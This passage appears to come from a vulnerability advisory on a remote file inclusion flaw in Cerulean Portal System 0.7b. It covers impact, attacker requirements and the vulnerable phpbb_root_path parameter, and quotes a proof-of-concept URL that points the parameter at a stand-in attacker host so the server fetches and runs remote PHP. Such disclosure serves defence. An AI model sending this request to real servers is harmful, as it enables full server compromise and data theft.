- Improper input sanitization

**Impact of Exploitation:**
- An attacker can include and execute arbitrary PHP code from a remote server on the target system.
- This could lead to complete compromise of the web server, including data theft, malware injection, and other malicious activities.

**Attack Vectors:**
- **HTTP GET request:** The vulnerable parameter `phpbb_root_path` is passed via a GET request in the URL.
- The attacker provides a URL to their malicious PHP script in the `phpbb_root_path` parameter.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server.
- The attacker requires a web server where they can host their malicious php script.
- No authentication is needed to exploit the vulnerability.

**Additional Details:**
- The exploit-db entry provides a proof-of-concept (POC) URL demonstrating how to trigger the vulnerability: `www.[target].com/[script_pat]/portal/portal.php?phpbb_root_path=http://evilscripts?`
- There are links provided to example HTML and Perl exploits.
- The vulnerable application is "Cerulean Portal System" version 0.7b.
